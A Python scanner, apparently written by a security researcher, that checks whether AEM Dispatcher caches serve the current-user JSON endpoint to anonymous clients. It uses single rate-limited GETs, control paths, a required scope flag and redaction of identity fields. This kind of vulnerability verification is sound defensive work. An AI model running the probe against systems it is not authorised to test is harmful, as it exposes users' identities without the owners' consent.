#!/usr/bin/env python3
"""
repro.py — field reproducer for the AEM Dispatcher cache leak
           (/libs/granite/security/currentuser.json served to anonymous clients).

What it does, per host, in this order:

  1. GET the exact path with no cookie and no Authorization header
       -> vulnerable: 200 + user JSON + X-Dispatcher
       -> correct:    401, or a redirect/200 to the SAML IdP
  2. GET the same path with a query string (`?_=1`) to force a cache miss
       -> this shows what the origin does when it is actually consulted
  3. GET two neighbouring protected paths as controls
       (profile.json, userinfo.json) — they should challenge on every host

Safety rails, because these are somebody else's production systems:

  * one request at a time, 2 s apart (configurable), never concurrent;
  * GET only, no auth attempts, no fuzzing, no flushing, no cache poisoning;
  * refuses to run without --confirm-scope;
  * redacts identity fields by default, and prints only the shape of what it saw.

Usage:

    cp examples/hosts.example.txt hosts.txt   # then fill in hosts you are authorised to test
    python3 repro.py --confirm-scope hosts.txt
    python3 repro.py --confirm-scope --json out.json hosts.txt

The full story, including why this is a 5.3 and not a 9.8, is in the write-up:
https://shoo0lin.github.io/posts/dispatcher-cache.html
"""
from __future__ import annotations

import argparse
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

PATH = "/libs/granite/security/currentuser.json"
NEIGHBOURS = ("/libs/granite/security/profile.json",
              "/libs/granite/security/userinfo.json")

IDENTITY_KEYS = ("type", "authorizableId", "name", "home", "isImpersonated")
UA = "aem-cache-repro/1.0 (authorised testing; single GET)"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def redact_identity(obj: dict) -> dict:
    """Replace the identifying values, keep the shape and the booleans."""
    out = {}
    for key in IDENTITY_KEYS:
        if key not in obj:
            continue
        value = obj[key]
        if key == "authorizableId" and isinstance(value, str):
            out[key] = "<redacted:email>" if "@" in value else "<redacted:username>"
        elif key == "name":
            out[key] = "<redacted>"
        elif key == "home":
            out[key] = re.sub(r"/home/users/.*", "/home/users/<redacted>", str(value))
        else:
            out[key] = value
    return out


def request(url: str, timeout: float = 10.0):
    ctx = ssl.create_default_context()
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx), NoRedirect())
    req = urllib.request.Request(url, headers={
        "User-Agent": UA,
        "Accept": "application/json, text/html;q=0.9, */*;q=0.8",
        "Cache-Control": "no-cache",
    })
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(65536), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(65536), url
    except Exception as e:  # noqa: BLE001 - network errors are part of the result
        return None, {}, str(e).encode(), url


def lower_headers(h: dict) -> dict:
    return {k.lower(): v for k, v in h.items()}


def classify(status, headers, body: bytes) -> str:
    h = lower_headers(headers)
    ctype = h.get("content-type", "")
    if status is None:
        return "ERROR"
    if status == 200 and "json" in ctype:
        if b'"authorizableId"' in body or b'"anonymous"' in body:
            return "CACHE_HIT" if "x-dispatcher" in h else "JSON_NO_DISPATCHER"
        return "JSON_OTHER"
    if status in (301, 302, 303, 307, 308):
        return "REDIRECT"
    if status == 401:
        return "AUTH_REQUIRED"
    if status == 403:
        return "DENIED"
    if status == 200 and "html" in ctype:
        return "SAML_PAGE"
    return f"HTTP_{status}"


def probe(host: str, delay: float, neighbours: bool):
    # Accept a bare hostname (https assumed) or a full base URL (used to point the
    # same checks at the local lab: http://127.0.0.1:18090).
    base = host.rstrip("/") if "://" in host else f"https://{host}"
    rec = {"host": host, "checked_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
           "observations": {}}

    status, headers, body, final = request(base + PATH)
    h = lower_headers(headers)
    kind = classify(status, headers, body)
    obs = {
        "path": PATH,
        "status": status,
        "classification": kind,
        "x_dispatcher": h.get("x-dispatcher"),
        "x_vhost": h.get("x-vhost"),
        "last_modified": h.get("last-modified"),
        "cache_control": h.get("cache-control"),
        "content_type": h.get("content-type"),
        "bytes": len(body),
    }
    identity = None
    if kind in ("CACHE_HIT", "JSON_NO_DISPATCHER"):
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                obs["identity_shape"] = redact_identity(obj)
                identity = obs["identity_shape"]
        except ValueError:
            obs["identity_shape"] = "<unparseable>"
    rec["observations"]["cached"] = obs

    time.sleep(delay)
    status2, headers2, body2, _ = request(base + PATH + "?_=1")
    h2 = lower_headers(headers2)
    rec["observations"]["cache_miss"] = {
        "path": PATH + "?_=1",
        "status": status2,
        "classification": classify(status2, headers2, body2),
        "location": h2.get("location"),
        "x_dispatcher": h2.get("x-dispatcher"),
        "bytes": len(body2),
    }

    if neighbours:
        rec["observations"]["neighbours"] = {}
        for npath in NEIGHBOURS:
            time.sleep(delay)
            s, hd, b, _ = request(base + npath)
            hh = lower_headers(hd)
            rec["observations"]["neighbours"][npath] = {
                "status": s,
                "classification": classify(s, hd, b),
                "bytes": len(b),
                "location": hh.get("location"),
            }

    leak = obs["classification"] in ("CACHE_HIT", "JSON_NO_DISPATCHER")
    miss_challenges = rec["observations"]["cache_miss"]["classification"] in (
        "AUTH_REQUIRED", "REDIRECT", "SAML_PAGE", "DENIED")
    rec["verdict"] = "VULNERABLE" if leak else ("NOT_VULNERABLE" if miss_challenges else "INCONCLUSIVE")
    return rec


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("hosts", nargs="?", help="file with one hostname per line (# comments allowed)")
    ap.add_argument("--confirm-scope", action="store_true",
                    help="required: you are authorised to send these GETs")
    ap.add_argument("--delay", type=float, default=2.0, help="seconds between requests (default 2.0)")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--no-neighbours", action="store_true", help="skip the two control paths")
    ap.add_argument("--json", metavar="FILE", help="write the redacted evidence to FILE")
    ap.add_argument("--dry-run", action="store_true", help="print the plan and exit")
    args = ap.parse_args()

    if not args.confirm_scope:
        ap.error("refusing to run without --confirm-scope (these are production systems)")
    if not args.hosts:
        ap.error("give a hosts file, e.g. examples/hosts.example.txt")

    hosts = []
    for raw in open(args.hosts, encoding="utf-8"):
        host = raw.split("#", 1)[0].strip()
        if host:
            hosts.append(host)
    if not hosts:
        ap.error("no hosts in the file")

    plan = {
        "targets": len(hosts),
        "requests_per_host": 2 + (0 if args.no_neighbours else len(NEIGHBOURS)),
        "rate": f"1 request per {args.delay}s, sequential",
        "path": PATH,
        "identity_fields": "redacted by default",
    }
    if args.dry_run:
        print(json.dumps(plan, indent=2))
        return 0

    print("AEM Dispatcher cache leak — field probe")
    print(f"targets: {len(hosts)} host(s), {plan['requests_per_host']} GETs each, "
          f"{args.delay}s apart, sequential")
    print(f"path: {PATH}")
    print(f"started: {datetime.now(timezone.utc).isoformat(timespec='seconds')}")
    print("-" * 100)

    records = []
    for i, host in enumerate(hosts, 1):
        print(f"[{i}/{len(hosts)}] {host}")
        rec = probe(host, args.delay, not args.no_neighbours)
        records.append(rec)
        o = rec["observations"]["cached"]
        m = rec["observations"]["cache_miss"]

        print(f"  GET {PATH}")
        print(f"    {o['status']}  {o['classification']:<17} dispatcher={o['x_dispatcher'] or '-'}"
              f"  last-modified={o['last_modified'] or '-'}")
        if o.get("identity_shape"):
            print(f"    identity: {json.dumps(o['identity_shape'])}")
        print(f"  GET {PATH}?_=1")
        print(f"    {m['status']}  {m['classification']:<17} "
              f"{('→ ' + m['location']) if m.get('location') else ''}".rstrip())
        if "neighbours" in rec["observations"]:
            for npath, n in rec["observations"]["neighbours"].items():
                print(f"  GET {npath}")
                print(f"    {n['status']}  {n['classification']}")
        print(f"  verdict: {rec['verdict']}")
        print()

        if i < len(hosts):
            time.sleep(args.delay)

    vuln = sum(r["verdict"] == "VULNERABLE" for r in records)
    print("-" * 100)
    print(f"summary: {vuln}/{len(records)} host(s) served a cached identity anonymously")
    if vuln:
        print("note: that is an identity disclosure, not a session theft — see the write-up "
              "for the impact boundary.")

    if args.json:
        payload = {
            "tool": "aem-cache-repro/1.0",
            "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "path": PATH,
            "redaction": "authorizableId/name/home replaced; booleans and shape kept",
            "records": records,
        }
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2)
            fh.write("\n")
        print(f"evidence: {args.json} (redacted)")

    return 0 if vuln else 1


if __name__ == "__main__":
    raise SystemExit(main())
